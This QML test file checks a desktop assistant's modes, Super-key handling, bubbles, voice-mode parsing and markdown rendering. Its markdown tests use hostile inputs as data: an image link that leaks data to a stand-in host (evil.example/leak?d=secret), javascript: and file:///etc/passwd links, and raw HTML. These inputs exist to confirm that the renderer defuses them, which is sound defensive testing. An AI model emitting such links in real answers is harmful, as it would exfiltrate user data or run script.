// The assistant's modes and keys as data (desktop/shell/services/assistant.js),
// run by test_shell_logic.py with qmltestrunner.
import QtQuick
import QtTest
import "../../../desktop/shell/services/assistant.js" as Logic

TestCase {
    name: "Assistant"

    readonly property var hidden: Logic.view("", false, false, "bubbles")

    // Runs events through the Super key, and returns the actions they made.
    function keys(events) {
        let state = "idle";
        const actions = [];
        for (const event of [...events, "late"]) {
            const next = Logic.key(state, event);
            state = next.state;
            if (next.action)
                actions.push(next.action);
        }
        compare(state, "idle");
        return actions;
    }

    // Modes ------------------------------------------------------------

    function test_a_tap_opens_the_bubbles_first_and_closes_them() {
        const open = Logic.tap(hidden);
        compare(open.open, "bubbles");
        compare(Logic.tap(open).open, "");
    }

    function test_a_tap_opens_what_was_open_last() {
        const panel = Logic.toPanel(Logic.tap(hidden));
        compare(panel.open, "panel");
        const closed = Logic.hide(panel);
        compare(closed.open, "");
        compare(Logic.tap(closed).open, "panel");
        // And the bubbles again, once they were the last.
        const bubbles = Logic.hide(Logic.view("bubbles", false, true, "panel"));
        compare(Logic.tap(bubbles).open, "bubbles");
    }

    function test_a_tap_closes_the_panel_over_the_windows() {
        const panel = Logic.toPanel(hidden);
        verify(!panel.docked);
        compare(Logic.tap(panel).open, "");
    }

    function test_a_tap_closes_the_docked_panel_too() {
        const docked = Logic.dock(Logic.toPanel(hidden), true, false);
        verify(docked.docked && docked.focused);
        const closed = Logic.tap(docked);
        compare(closed.open, "");
        verify(closed.docked);
        // Without the keyboard, too.
        compare(Logic.tap(Logic.view("panel", true, false, "panel")).open, "");
    }

    function test_docking_reserves_the_width_and_undocking_gives_it_back() {
        const panel = Logic.toPanel(hidden);
        verify(!Logic.reserves(panel, false));
        const docked = Logic.dock(panel, true, false);
        verify(Logic.reserves(docked, false));
        verify(!Logic.reserves(Logic.dock(docked, false, false), false));
        verify(!Logic.reserves(Logic.hide(docked), false));
    }

    function test_a_hidden_docked_panel_comes_back_docked() {
        const back = Logic.tap(Logic.hide(Logic.dock(Logic.toPanel(hidden), true, false)));
        compare(back.open, "panel");
        verify(back.docked);
    }

    function test_a_narrow_screen_never_docks() {
        const panel = Logic.dock(Logic.toPanel(hidden), true, true);
        verify(!panel.docked);
        verify(!Logic.reserves(Logic.view("panel", true, true, "panel"), true));
    }

    function test_modes_change_nothing_given() {
        const view = Logic.view("bubbles", false, true, "bubbles");
        Logic.tap(view);
        Logic.toPanel(view);
        Logic.hide(view);
        compare(view, Logic.view("bubbles", false, true, "bubbles"));
    }

    // The Super key ----------------------------------------------------

    function test_super_let_go_soon_is_a_tap() {
        compare(keys(["down", "up"]), ["tap"]);
    }

    function test_super_held_listens_and_let_go_sends() {
        compare(keys(["down", "held", "up"]), ["listen", "send"]);
    }

    function test_super_with_another_key_is_a_shortcut_not_a_tap() {
        compare(keys(["down", "other", "up"]), []);
    }

    function test_another_key_while_listening_discards_the_speech() {
        compare(keys(["down", "held", "other", "up"]), ["listen", "cancel"]);
    }

    function test_a_key_never_let_go_stops_listening_and_discards() {
        // As when something else takes the keyboard while Super is down.
        compare(keys(["down", "held", "long"]), ["listen", "cancel"]);
        // Its letting go, should it come after all, is no tap.
        compare(keys(["down", "held", "long", "up"]), ["listen", "cancel"]);
    }

    function test_a_late_timer_after_a_shortcut_does_not_listen() {
        compare(keys(["down", "other", "held", "up"]), []);
    }

    function test_super_let_go_after_listening_is_no_tap() {
        verify(!keys(["down", "held", "up"]).includes("tap"));
    }

    // Bubbles ----------------------------------------------------------

    function test_the_latest_bubbles_are_full_and_the_older_dimmed() {
        const dim = [0, 1, 2, 3, 4].map(i => Logic.dimmed(i, 5, false));
        compare(dim, [true, true, false, false, false]);
        verify(!Logic.dimmed(0, 2, false));
    }

    function test_scrolling_back_shows_every_bubble_in_full() {
        verify(!Logic.dimmed(0, 5, true));
    }

    function test_an_answer_brings_the_bubbles_up_while_hidden() {
        verify(Logic.peeks(hidden, false, { role: "assistant", state: "done", text: "It is 40%." }));
        verify(Logic.peeks(hidden, false, { role: "assistant", state: "failed", error: "No model." }));
        verify(Logic.peeks(hidden, false, { role: "action", state: "proposed" }));
        verify(Logic.peeks(hidden, false, { role: "action", state: "done" }));
    }

    function test_nothing_comes_up_for_what_is_under_way_or_the_persons_own() {
        verify(!Logic.peeks(hidden, false, { role: "assistant", state: "thinking", text: "" }));
        verify(!Logic.peeks(hidden, false, { role: "assistant", state: "answering", text: "It" }));
        verify(!Logic.peeks(hidden, false, { role: "assistant", state: "done", text: "" }));
        verify(!Logic.peeks(hidden, false, { role: "action", state: "running" }));
        verify(!Logic.peeks(hidden, false, { role: "user", state: "sent", text: "Volume?" }));
    }

    function test_nothing_comes_up_over_the_assistant_or_another_panel() {
        const answer = { role: "assistant", state: "done", text: "Done." };
        verify(!Logic.peeks(Logic.view("panel", false, true, "panel"), false, answer));
        verify(!Logic.peeks(Logic.view("bubbles", false, true, "bubbles"), false, answer));
        verify(!Logic.peeks(hidden, true, answer));
    }

    function test_bubbles_that_came_up_stay_while_one_waits_or_is_pointed_at() {
        verify(Logic.peekEnds(false, false));
        verify(!Logic.peekEnds(true, false));
        verify(!Logic.peekEnds(false, true));
    }

    function test_a_conversation_left_for_a_while_is_over() {
        verify(Logic.continues(1000, 1000 + 60));
        verify(!Logic.continues(1000, 1000 + Logic.restAfter));
    }

    // The docked panel's width -----------------------------------------

    function test_the_width_stays_between_the_least_and_half_the_screen() {
        compare(Logic.width(340, 1920), 340);
        compare(Logic.width(100, 1920), Logic.leastWidth);
        compare(Logic.width(5000, 1920), 960);
    }

    // Listening --------------------------------------------------------

    function test_it_listens_only_where_it_may_and_can() {
        compare(Logic.cannotListen(false, false, false, true, true, true), "");
        compare(Logic.cannotListen(true, false, false, true, true, true), "locked");
        compare(Logic.cannotListen(false, true, false, true, true, true), "locked");
        compare(Logic.cannotListen(false, false, true, true, true, true), "dictating");
        compare(Logic.cannotListen(false, false, false, false, true, true), "download");
        compare(Logic.cannotListen(false, false, false, true, true, false), "download");
        compare(Logic.cannotListen(false, false, false, true, false, true), "microphone");
    }

    // What a request tells ---------------------------------------------

    function test_a_request_tells_the_selection_and_the_window_and_no_more() {
        compare(Logic.context("  some words \n", "firefox", "Docs", 2000), { selection: "some words", app: "firefox", title: "Docs" });
        compare(Logic.context("", "", "", 2000), {});
        compare(Logic.context("abcdef", "", "", 3), { selection: "abc" });
    }

    // Markdown ---------------------------------------------------------

    function test_plain_answers_stay_plain() {
        compare(Logic.markdown(""), "");
        compare(Logic.markdown("Paris is the capital of France."), "");
        compare(Logic.markdown("It costs 2 * 3 = 6 dollars, and a < b."), "");
    }

    function test_marked_answers_are_markdown() {
        for (const text of ["# Heap\nMemory.", "Steps:\n- one\n- two", "1. first\n2. second", "It is **heap** memory.",
                            "Run `ls` here.", "```\ncode\n```", "> quoted", "See [docs](https://example.org).",
                            "| a | b |\n|---|---|\n| 1 | 2 |"])
            verify(Logic.markdown(text) !== "", text);
    }

    function test_pictures_become_links_and_html_shows_as_text() {
        const link = '<a href="https://evil.example/leak?d=secret"><font color="#7aa2ff">x</font></a>';
        compare(Logic.markdown("**Hi** ![x](https://evil.example/leak?d=secret)", "#7aa2ff"), "**Hi** " + link);
        compare(Logic.markdown("**Hi** <img src=https://evil.example/x>", "#7aa2ff"), "**Hi** &lt;img src=https://evil.example/x>");
        compare(Logic.markdown("**Hi** ![ref][1]\n\n[1]: https://evil.example/x", "#7aa2ff"), "**Hi** [ref][1]\n\n[1]: https://evil.example/x");
    }

    function test_links_open_only_to_the_web_and_mail_in_the_link_color() {
        compare(Logic.markdown("See [docs](https://example.org).", "#7aa2ff"),
                'See <a href="https://example.org"><font color="#7aa2ff">docs</font></a>.');
        compare(Logic.markdown("**a** [mail](mailto:a@example.org) [](https://example.org)", "#123456"),
                '**a** <a href="mailto:a@example.org"><font color="#123456">mail</font></a> '
                + '<a href="https://example.org"><font color="#123456">https://example.org</font></a>');
        compare(Logic.markdown("**a** [run](javascript:alert(1)) [home](file:///etc/passwd) [q](https://x.org/\"onclick)", "#1"),
                "**a** run) home q");
    }

    function test_code_stays_as_written_even_while_it_comes() {
        compare(Logic.markdown("Use `a < b` and `![x](https://y.org)`."), "Use `a < b` and `![x](https://y.org)`.");
        compare(Logic.markdown("```html\n<b>bold</b> ![x](y)\n```\n<b>"), "```html\n<b>bold</b> ![x](y)\n```\n&lt;b>");
        compare(Logic.markdown("Code:\n```\nif (a < b)"), "Code:\n```\nif (a < b)");
    }

    function test_only_web_and_mail_links_open() {
        verify(Logic.opens("https://example.org"));
        verify(Logic.opens("mailto:a@example.org"));
        verify(!Logic.opens("file:///etc/passwd"));
        verify(!Logic.opens("javascript:alert(1)"));
        verify(!Logic.opens(""));
    }

    // Voice mode -------------------------------------------------------

    function test_a_double_tap_starts_voice_mode_after_the_first_tap_acted() {
        compare(keys(["down", "up", "down", "up"]), ["tap", "converse"]);
        // Too late for a double tap: two taps.
        compare(keys(["down", "up", "late", "down", "up"]), ["tap", "tap"]);
        // Held on the second press, it listens as ever.
        compare(keys(["down", "up", "down", "held", "up"]), ["tap", "listen", "send"]);
        // A shortcut on the second press is no double tap.
        compare(keys(["down", "up", "down", "other", "up"]), ["tap"]);
    }

    function test_a_short_answer_answers_and_anything_else_is_a_request() {
        for (const yes of ["Yes.", "yes please", "OK!", "Okay.", "Tak.", "Do it.", "Zrób to."])
            compare(Logic.spokenAnswer(yes), "apply", yes);
        for (const no of ["No.", "Nope", "Cancel.", "Don't.", "Nie.", "Anuluj"])
            compare(Logic.spokenAnswer(no), "decline", no);
        for (const request of ["Yes, and turn the volume down.", "No idea what that is", "Turn Wi-Fi off.", ""])
            compare(Logic.spokenAnswer(request), "", request);
    }

    function test_stop_ends_voice_mode_but_a_request_with_stop_does_not() {
        for (const stop of ["Stop.", "Stop listening.", "That's all.", "Koniec.", "Wystarczy!"])
            verify(Logic.stopsListening(stop), stop);
        for (const request of ["Stop the music.", "Stop Wi-Fi", "What is a bus stop?"])
            verify(!Logic.stopsListening(request), request);
    }

    function test_an_answer_is_said_by_whole_sentences_as_it_comes() {
        // A sentence goes once its end and the space after it are there.
        compare(Logic.sentencesEnd("The battery is at 76", 0), 0);
        compare(Logic.sentencesEnd("The battery is at 76%. It is", 0), 23);
        compare(Logic.sentencesEnd("The battery is at 76%. It is charging.", 23), 23);
        compare(Logic.sentencesEnd("The battery is at 76%. It is charging. ", 23), 39);
        // Not a decimal point, nor a version; but a line's end, and a quote's.
        compare(Logic.sentencesEnd("It is 3.5 GB", 0), 0);
        compare(Logic.sentencesEnd("Done\nNext", 0), 5);
        compare(Logic.sentencesEnd("He said \"yes.\" Then", 0), 15);
        compare(Logic.sentencesEnd("Gotowe! Coś jeszcze?", 0), 8);
    }
}
